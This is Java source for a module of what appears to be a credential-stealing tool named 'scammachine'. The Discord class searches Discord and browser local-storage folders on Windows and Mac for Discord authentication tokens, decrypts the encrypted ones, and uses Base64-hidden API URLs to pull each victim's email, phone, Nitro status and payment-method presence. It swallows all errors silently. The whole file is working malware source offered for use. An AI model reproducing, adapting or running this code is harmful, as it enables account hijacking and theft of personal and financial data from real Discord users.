package me.teejayx6.scammachine.payloadz;

import com.google.crypto.tink.aead.AeadConfig;
import com.google.gson.Gson;
import com.google.gson.JsonObject;
import com.google.gson.JsonParser;
import com.sun.jna.platform.win32.Crypt32Util;
import me.teejayx6.scammachine.util.FileUtils;
import me.teejayx6.scammachine.util.TempFile;

import javax.net.ssl.HttpsURLConnection;
import java.io.*;
import java.net.URL;
import java.nio.charset.StandardCharsets;
import java.nio.file.Files;
import java.nio.file.Paths;
import java.security.GeneralSecurityException;
import java.util.ArrayList;
import java.util.Arrays;
import java.util.Base64;
import java.util.regex.Matcher;
import java.util.regex.Pattern;

public final class Discord
{
    public static String encryptedKey;
    public static byte[] decryptedKey;
    private static ArrayList<String> paths = new ArrayList<>();
    public static String execute()
    {
        String system = System.getProperty("os.name");
        String user = System.getProperty("user.home");
        if (system.contains("Windows")) {
            paths.add(user + "/AppData/Roaming/discord/Local Storage/leveldb/");
            paths.add(user + "/AppData/Roaming/discordptb/Local Storage/leveldb/");
            paths.add(user + "/AppData/Roaming/discordcanary/Local Storage/leveldb/");
            paths.add(user + "/AppData/Roaming/Opera Software/Opera Stable/Local Storage/leveldb/");
            paths.add(user + "/AppData/Local/Google/Chrome/User Data/Default/Local Storage/leveldb/");
            // это нихуя не работает
            //paths.add(user + "/AppData/Roaming/Mozilla/Firefox/Profiles/");
            //paths.add(user + "/AppData/Roaming/Waterfox/Profiles/");
            paths.add(user + "/AppData/Local/Microsoft/Edge/User Data/Default/Local Storage/leveldb/");
            paths.add(user + "/AppData/Local/Vivaldi/User Data/Default/Local Storage/leveldb/");
            paths.add(user + "/AppData/Local/Yandex/YandexBrowser/User Data/Default/Local Storage/leveldb/");
            paths.add(user + "/AppData/Roaming/Yandex/YandexBrowser/User Data/Default/Local Storage/leveldb/");
            paths.add(user + "/AppData/Local/BraveSoftware/Brave-Browser/User Data/Default/Local Storage/leveldb/");
            paths.add(user + "/AppData/Roaming/BraveSoftware/Brave-Browser/User Data/Default/Local Storage/leveldb/");
        } else if (system.contains("Mac") || system.contains("darwin")) {
            paths.add(user + "/Library/Application Support/discord/Local Storage/leveldb/");
            paths.add(user + "/Library/Application Support/discordptb/Local Storage/leveldb/");
            paths.add(user + "/Library/Application Support/discordcanary/Local Storage/leveldb/");
            paths.add(user + "/Library/Application Support/Firefox/Profiles/");
            paths.add(user + "/Library/Application Support/Google/Chrome/User Data/Default/Local Storage/leveldb/");
        }

        StringBuilder tokens = new StringBuilder();

        tokens.append(scan());

        if (tokens.length() == 0)
            return "None";

        return tokens.toString();
    }

    private static String scan()
    {
        StringBuilder tokens = new StringBuilder();

        for (String path : paths)
        {
            File file = new File(path);
            if (file != null)
                tokens.append(scanFolder(file, 0));
        }

        return tokens.toString();
    }

    private static String scanFolder(File folder, int i)
    {
        StringBuilder tokens = new StringBuilder();

        File[] realfolder = folder.listFiles();
        if (realfolder == null)
            return tokens.toString();

        for (File file : realfolder)
        {
            if (file.isDirectory())
            {
                if (i < 2)
                    tokens.append(scanFolder(file, i + 1));
            }
            else
            {
                try
                {
                    //if (validExtension(file.getName()))
                    {
                        TempFile tmp = FileUtils.readFile(file.getAbsolutePath());
                        BufferedReader reader = new BufferedReader(new InputStreamReader(new FileInputStream(tmp.newpath)));
                        String line;
                        while ((line = reader.readLine()) != null)
                        {
                            Pattern p = Pattern.compile("[nNmM][\\w\\W]{23}\\.[xX][\\w\\W]{5}\\.[\\w\\W]{27}|mfa\\.[\\w\\W]{84}");
                            Pattern dp = Pattern.compile("dQw4w9WgXcQ:[^\"]*");
                            Matcher m = p.matcher(line);
                            Matcher dm = dp.matcher(line);

                            while (m.find())
                            {
                                String token = m.group();

                                tokens.append(token);

                                String userdata = GetUserData(token);
                                if (userdata != null)
                                    tokens.append("\n" + userdata + "\n=========");

                                tokens.append("\n");
                            }

                            while (dm.find()) {
                                String token = dm.group();

                                String decrypted = Passwords.decrypt(Base64.getDecoder().decode(token.split("dQw4w9WgXcQ:")[1]), decryptedKey);

                                tokens.append(decrypted);

                                String userdata = GetUserData(decrypted);
                                if (userdata != null)
                                    tokens.append("\n" + userdata + "\n=========");

                                tokens.append("\n");
                            }

                        }
                        FileUtils.close(tmp);
                        reader.close();
                    }
                }
                catch (Exception e)
                {

                }
            }
        }

        return tokens.toString();
    }

    public static String GetUserData(String token)
    {
        try
        {
            URL url = new URL(new String(Base64.getDecoder().decode("aHR0cHM6Ly9kaXNjb3JkYXBwLmNvbS9hcGkvdjYvdXNlcnMvQG1l"), StandardCharsets.UTF_8));
            HttpsURLConnection conn = (HttpsURLConnection)url.openConnection();

            conn.setRequestProperty("Authorization", token);
            conn.setRequestProperty("Content-Type", "application/json");
            conn.setRequestProperty("User-Agent", "Mozilla/5.0 (Windows NT 6.0; en-US; rv:1.9.0.20) Gecko/20220510 Firefox/36.0");

            BufferedReader reader = new BufferedReader(new InputStreamReader(conn.getInputStream()));
            StringBuilder sb = new StringBuilder();
            String line;
            while ((line = reader.readLine()) != null)
                sb.append(line);

            reader.close();
            conn.disconnect();

            if (sb.length() > 0)
            {
                JsonObject obj = new Gson().fromJson(sb.toString(), JsonObject.class);

                String info = obj.get("username").getAsString() + "#" + obj.get("discriminator").getAsString() + "\n";
                info += GetJsonString(obj, "id", "ID: ");
                info += GetJsonString(obj, "email", "Email: ");
                info += GetJsonString(obj, "phone", "Phone: ");
                info += "Nitro: ";
                String str = new String(Base64.getDecoder().decode("cHJlbWl1bV90eXBl"), StandardCharsets.UTF_8); // premium_type
                if (obj.has(str) && obj.get(str).getAsInt() > 0)
                    info += "true\n";
                else
                    info += "false\n";
                info += "Payments: ";
                if (HasPaymentMethods(token))
                    info += "true\n";
                else
                    info += "false\n";
                return info;
            }
        }
        catch (Exception e)
        {

        }

        return null;
    }

    public static boolean HasPaymentMethods(String token)
    {
        try
        {
            URL url = new URL(new String(Base64.getDecoder().decode("aHR0cHM6Ly9kaXNjb3JkYXBwLmNvbS9hcGkvdjYvdXNlcnMvQG1lL2JpbGxpbmcvcGF5bWVudC1zb3VyY2Vz"), StandardCharsets.UTF_8));
            HttpsURLConnection conn = (HttpsURLConnection)url.openConnection();

            conn.setRequestProperty("Authorization", token);
            conn.setRequestProperty("Content-Type", "application/json");
            conn.setRequestProperty("User-Agent", "Mozilla/5.0 (Windows NT 6.0; en-US; rv:1.9.0.20) Gecko/20220510 Firefox/36.0");

            BufferedReader reader = new BufferedReader(new InputStreamReader(conn.getInputStream()));
            StringBuilder sb = new StringBuilder();
            String line;
            while ((line = reader.readLine()) != null)
                sb.append(line);

            reader.close();
            conn.disconnect();

            return sb.toString().length() > 2;
        }
        catch (Exception e)
        {

        }

        return false;
    }

    public static String GetJsonString(JsonObject obj, String str, String addstr)
    {
        try
        {
            if (!obj.has(str))
                return "";
            return addstr + (obj.get(str).getAsString() + "\n");
        }
        catch (Exception e)
        {
            return "";
        }
    }
}
